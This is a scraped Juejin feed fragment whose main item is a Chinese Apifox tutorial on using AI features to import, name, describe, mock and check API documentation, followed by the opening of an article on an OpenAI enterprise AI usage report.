<p><a href="https://link.juejin.cn?target=https%3A%2F%2Faiworld.eu%2Fstory%2Ffrom-beijing-to-san-francisco-what-neurips-2025-reveals-about-ai-leadership" target="_blank" title="https://aiworld.eu/story/from-beijing-to-san-francisco-what-neurips-2025-reveals-about-ai-leadership" ref="nofollow noopener noreferrer">aiworld.eu/story/from-…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何在 Apifox 中借助 AI 设计一份规范的接口文档？]]></title>    <link>https://juejin.cn/post/7581738974425464851</link>    <guid>https://juejin.cn/post/7581738974425464851</guid>    <pubDate>2025-12-10T03:14:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974425464851" data-draft-id="7581738974424662035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何在 Apifox 中借助 AI 设计一份规范的接口文档？"/> <meta itemprop="keywords" content="前端,后端,测试"/> <meta itemprop="datePublished" content="2025-12-10T03:14:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Apifox"/> <meta itemprop="url" content="https://juejin.cn/user/2766843870448222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何在 Apifox 中借助 AI 设计一份规范的接口文档？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2766843870448222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Apifox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:14:47.000Z" title="Wed Dec 10 2025 03:14:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>通过 Apifox 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapifox-idea-plugin" target="_blank" title="https://docs.apifox.com/apifox-idea-plugin" ref="nofollow noopener noreferrer">IDEA 插件</a>，或者一些 Swagger 插件，你可以很方便地将代码中的 API 生成接口文档，这解决了从零开始写文档的问题。</p>
<p>不过，即使接口写完了，文档也生成了，心里可能还是会有点不踏实，或许会斟酌<strong>这个接口设计得怎么样？文档搞得够不够规范？还有没有什么地方能再优化一下？</strong></p>
<p>特别是在团队协作中，你会希望自己写的接口文档能让其他小伙伴一看懂。命名是否清晰、信息是否完整，这些都会直接影响他们使用你接口时的体验。</p>
<p><strong>Apifox 近来陆续上线了几个 AI 功能，专门帮你在这个阶段进一步优化接口文档</strong>。不管是完善现有的接口信息，还是从其他地方导入已有的接口文档，AI 都能给你一些实用的建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eadb5c552fe443b6adf9297d5df365c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=w5f2DrGZrRgV%2BV%2B2cy%2BygSdqiPw%3D" alt="" loading="lazy"/></p>
<p>下面我们就来看看，如何在 Apifox 中借助 AI 设计一份更规范的接口文档。在开始之前，请确认你已经将 Apifox 更新到最新版，并已开启 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fenable-ai-features" target="_blank" title="https://docs.apifox.com/enable-ai-features" ref="nofollow noopener noreferrer">AI 功能</a>和配置 AI 模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e5de82ee2244679d7bb480c218d655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=WTGIPDMdikUz%2F7qjYO8BBN%2Femxk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">从现有文档开始导入</h2>
<p>有时候你需要把其他地方的接口文档迁移到 Apifox 中。如果文档是标准格式，Apifox 本身已经支持多种导入方式：可以通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapifox-idea-plugin" target="_blank" title="https://docs.apifox.com/apifox-idea-plugin" ref="nofollow noopener noreferrer">IDEA 插件</a>扫描代码中的接口，也可以导入 OpenAPI/Swagger 文件，还支持从 Postman 等其他工具迁移。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/460fa0a30b704c5ea5119b180e26b630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=LowYScojWl%2BF8l01CJacCZxYFjE%3D" alt="" loading="lazy"/></p>
<p>但也有一些情况下，你手头的文档可能不是这些标准格式。比如团队之前用 Markdown 记录接口，或者在 Word 文档里整理了一些字段说明，甚至是在聊天记录或邮件里找到的接口定义。这些非标准格式的内容，一个个字段录入想想都头大。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8959d8b738f6445d8daaeb7587484958~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=aZvQPznlDgo2Bf%2FTaM47lND%2FVqw%3D" alt="" loading="lazy"/></p>
<p>所以在这种情况下，如果想要轻松一点，就可以用「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fgenerate-data-schemas-with-ai" target="_blank" title="https://docs.apifox.com/generate-data-schemas-with-ai" ref="nofollow noopener noreferrer">AI 辅助参数修改</a>」功能来帮忙录入。假设你有一段这样的 Markdown 内容：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">| name       | desc                                          | type      | required |
| ---------- | --------------------------------------------- | --------- | -------- |
| usePaging  | 是否启用分页                                    | boolean   | true     |
| offset     | 起始位置（启用分页时必填）                        | int       | false    |
| pageSize   | 每页数量（启用分页时必填）                        | int       | false    |
| minPrice   | 最低价格（单位：分）                             | int       | false    |
| maxPrice   | 最高价格（单位：分）                             | int       | false    |
| brand      | 品牌编码                                       | string    | false    |
| categoryId | 商品分类 ID                                    | int       | false    |
| sortRule   | 排序方式：1→ 销量优先 2→ 价格升序 3→ 价格降序    | enum(int) | false    |
| keyword    | 搜索关键词（模糊匹配商品名）                      | string    | false    |
</code></pre>
<p>你只需要把这里的参数内容复制过来，然后告诉 AI：“帮我把这些内容转换成接口参数，注意类型和必填项”。AI 会自动识别字段名、类型、是否必填、描述等信息，并转换成 Apifox 的标准数据结构，就算里面包含枚举，也会自动整理成枚举类型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93af005643b642679a6b9204b15cf068~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=qj542t0iQ0X4Qk%2FcduFRc4qFzY0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">AI 帮你完善细节</h2>
<p>导入基本信息后，接下来就是完善细节了。</p>
<p>如果你拿捏不准一个字段的命名，可以使用「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Ffield-naming" target="_blank" title="https://docs.apifox.com/field-naming" ref="nofollow noopener noreferrer">AI 命名</a>」功能。AI 会结合接口上下文和接口设计规范，给出更准确的命名建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adfda69e5795441eba5d795104ec4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=PGkCYyqm51BH66hzrnuTX2OxYxw%3D" alt="" loading="lazy"/></p>
<p>字段描述或中文名称也可以交给 AI 来补全，自动生成更清晰、完整的说明。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f610a613ffe74ec79d2a6b1081b00df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=GaLJ%2F7Ym9574VFY1ilEvODyUIVI%3D" alt="" loading="lazy"/></p>
<p>Mock 数据的填充也是 AI 的强项。很多时候我们知道字段的含义，但不知道应该提供什么样的示例值。AI 会根据字段类型和描述，自动生成合理的示例数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d5ca93165034b16817dc6220f8a5925~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=qHT3H%2F2Lsug1nkP%2BjTR09xEBSM4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">完整性检查避免遗漏</h2>
<p>文档完善得差不多时，心里往往还是会有些不确定，可能会觉得有没有关键的信息还没补全？这时候就可以用 Apifox 的「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapi-docs-completeness-check" target="_blank" title="https://docs.apifox.com/api-docs-completeness-check" ref="nofollow noopener noreferrer">接口文档完整性检测</a>」功能，来检查文档中是否存在遗漏的地方。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b4b5d6fdd3b4ba1bf3978bd5d518412~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=sD0aPFi73vXnN5kgNKselHjXO4c%3D" alt="" loading="lazy"/></p>
<p>AI 会扫描你当前接口的接口文档，从多个角度检查可能的遗漏。检测完成后，会生成一份详细的报告，接口文档的每个检测内容都会进行打分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c9364ed4df247cbac9d8887c7b83ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=SgZFYnAGh1xLp7sGnowL3jpP33k%3D" alt="" loading="lazy"/></p>
<p>报告里不只是建议你做什么，还会给出为什么这么做的原因。比如你写了成功响应的格式，但没有描述可能的错误情况；你提供了基本的字段说明，但缺少使用限制或格式要求。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553776d4972f485db42cf0a30791f19f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=Ex5%2FfZNn5IcML31zspLLaIi9ySM%3D" alt="" loading="lazy"/></p>
<p>你可以根据报告里的建议来完善接口文档。</p>
<h2 data-id="heading-3">规范性检查保证一致性</h2>
<p>除了完整性之外，接口文档的规范性同样重要。同一个接口中，命名风格应该统一，字段类型定义要准确，响应结构要合理，这些细节对文档的可读性和可维护性影响很大。</p>
<p>Apifox 的「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapi-compliance-check" target="_blank" title="https://docs.apifox.com/api-compliance-check" ref="nofollow noopener noreferrer">接口规范性检测</a>」会从多个维度审查你的接口文档。它会检查命名是否一致，如果有些字段用了动词，有些用了名词，AI 会建议统一使用其中一种风格。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088cdb03785a4465bcfec156c6ae3ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=E5MVJYrWax8bDxvs7ku0QbpQrpw%3D" alt="" loading="lazy"/></p>
<p>它也会检查字段定义的规范性，例如字段命名是否混用了大小写风格、是否同时出现下划线和驼峰、是否存在不一致的缩写方式等等，并给出相应的调整建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/656ea3bced2442829bd77a689e92f014~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=Z1qJsxDDUj9nKSaj%2BBf6ck3WGMQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">总结</h2>
<p>完善以及规范接口文档是非常重要的，「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fgenerate-test-cases" target="_blank" title="https://docs.apifox.com/generate-test-cases" ref="nofollow noopener noreferrer">AI 生成测试用例</a>」也依赖接口文档的信息，文档越完整、越规范，AI 生成的用例就会越准确、越丰富。</p>
<p>你不需要一次性把所有 AI 功能都用上，也不需要完全改变现有的工作习惯。</p>
<p>整个过程是渐进式的。你可以从导入现有文档开始，然后逐步使用 AI 功能来完善和优化。当你对某个建议不确定时，可以先保持原样，等有更多上下文信息时再决定是否采纳。</p>
<p>随着使用次数的增加，你会发现自己对接口文档规范的理解在不断加深。AI 的建议不只是帮你解决当前的问题，更重要的是在潜移默化中培养更好的文档编写习惯</p>
<p>以上的这几个 Apifox 的 AI 功能，本质上是降低了写规范文档的门槛。它让你在不增加太多工作量的前提下，得到更高质量的文档。每次使用 AI 功能，都是在学习更好的文档编写方法，所以，快去用起来吧！</p>
<p>可以前往 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fhelp" target="_blank" title="https://docs.apifox.com/help" ref="nofollow noopener noreferrer">Apifox 帮助文档</a>，查看更多功能说明和操作指南。如有任何问题，欢迎在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fdoc-5751209%23%25E7%2594%25A8%25E6%2588%25B7%25E7%25BE%25A4%2F" target="_blank" title="https://docs.apifox.com/doc-5751209#%E7%94%A8%E6%88%B7%E7%BE%A4/" ref="nofollow noopener noreferrer">Apifox 用户群</a>与我们交流沟通。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰]]></title>    <link>https://juejin.cn/post/7581760987763032115</link>    <guid>https://juejin.cn/post/7581760987763032115</guid>    <pubDate>2025-12-10T03:10:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581760987763032115" data-draft-id="7581760987762999347" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-10T03:10:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI最新报告曝光！前5%精英效率暴涨16倍，普通人却被悄悄淘汰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:10:12.000Z" title="Wed Dec 10 2025 03:10:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa91ebf0cc8745af98921bd73f5885c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941011&amp;x-signature=wcUi5C5iVRZl5P1iiL1f6HGM4qM%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】当你还在纠结要不要用一下 AI 时，OpenAI 已经拎着 8 亿人的加班数据，在被谷歌和 Anthropic 逼到墙角的企业战场上拼命自救——到底是谁在每天白赚 1 小时，谁又在被时代悄悄淘汰？」</strong></h5>
<p>奥特曼紧急拉响「红色警报」后，OpenAI 对外放话：</p>
<p>我们，在企业级市场赢了。</p>
<p>最新数据显示，过去一年，企业用户对 OpenAI 工具的使用量猛增。</p>
<p>自 2024 年 11 月以来，ChatGPT 在企业场景的消息量，<strong>「增长了 8 倍」</strong>。企业数据反馈：员工**「每天平均能省下近 1 小时工作时间」**。</p>
<p>第三方数据也在佐证这一点。</p>
<p>Ramp AIIndex 统计：<strong>「美国接近 36% 的企业已成为 ChatGPT Enterprise 客户」</strong>，Anthropic 的占比为 14.3%。</p>
<p>基于 **「8 亿周活跃用户」**和 **「9000 名企业员工」**的数据分析，OpenAI 在最新《企业 AI 现状报告》中得出一个结论：</p>
<p>企业 AI 采用率不只在上升，而是在 加速、加深 。</p>
